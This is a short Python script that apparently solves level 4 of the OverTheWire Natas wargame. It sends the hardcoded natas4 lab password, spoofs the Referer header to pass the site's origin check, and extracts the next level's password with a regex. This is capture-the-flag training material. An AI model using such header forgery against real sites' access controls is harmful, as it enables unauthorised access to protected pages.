import requests
import re

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
headerst = {"Referer": "http://natas5.natas.labs.overthewire.org/"}
url = 'http://%s.natas.labs.overthewire.org/' % username
res = requests.get(url, auth=(username, password), headers=headerst)
content = res.text
# print(content)
print(re.findall("Access granted. The password for natas5 is (.*)", content)[0])
